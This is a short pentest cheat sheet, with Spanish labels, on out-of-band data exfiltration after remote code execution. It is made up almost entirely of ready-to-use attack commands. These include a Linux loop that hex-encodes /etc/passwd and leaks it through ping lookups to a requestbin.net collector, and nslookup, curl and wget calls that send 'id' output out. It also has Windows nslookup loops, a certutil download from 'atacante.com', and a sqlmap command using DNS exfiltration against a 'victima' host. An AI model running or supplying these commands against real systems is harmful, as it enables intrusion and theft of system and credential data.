# RCE Dns-data-exfiltration

## Testing
```
dig test.4f4984e83e92a11d53b7.d.requestbin.net
ping -c 2 test.4f4984e83e92a11d53b7.d.requestbin.net
ping -n 2 test.4f4984e83e92a11d53b7.d.requestbin.net
nslookup test.4f4984e83e92a11d53b7.d.requestbin.net
```

## Windows
```
for /f %i in ('cd') do nslookup %i.4f4984e83e92a11d53b7.d.requestbin.net
for /f "tokens=1" %i IN ('cd') do (nslookup %i 4f4984e83e92a11d53b7.d.requestbin.net)
for /f "tokens=1" %i IN 'cd' do (nslookup %i 4f4984e83e92a11d53b7.d.requestbin.net)
certutil -urlcache -split -f http://atacante.com/test.txt \windows\temp\test.txt
```

## Linux
```
cat /etc/passwd | xxd -p -c 16 | while read exfil; do ping -c 1 $exfil.4f4984e83e92a11d53b7.d.requestbin.net;done
nslookup $(id).4f4984e83e92a11d53b7.d.requestbin.net
curl http://requestbin.net/r/1m8fdwf1/$(id)
wget http://requestbin.net/r/1m8fdwf1/$(id)
```

## Otros
```
sqlmap -u 'http://victima/test.php?id=1' -p uid --dbs --technique T --dbms mssql --level 5 --risk 3 --dns-domain 4f4984e83e92a11d53b7.d.requestbin.net
```

https://www.youtube.com/watch?v=Egwp5zc5ZIM
https://www.notsosecure.com/oob-exploitation-cheatsheet/
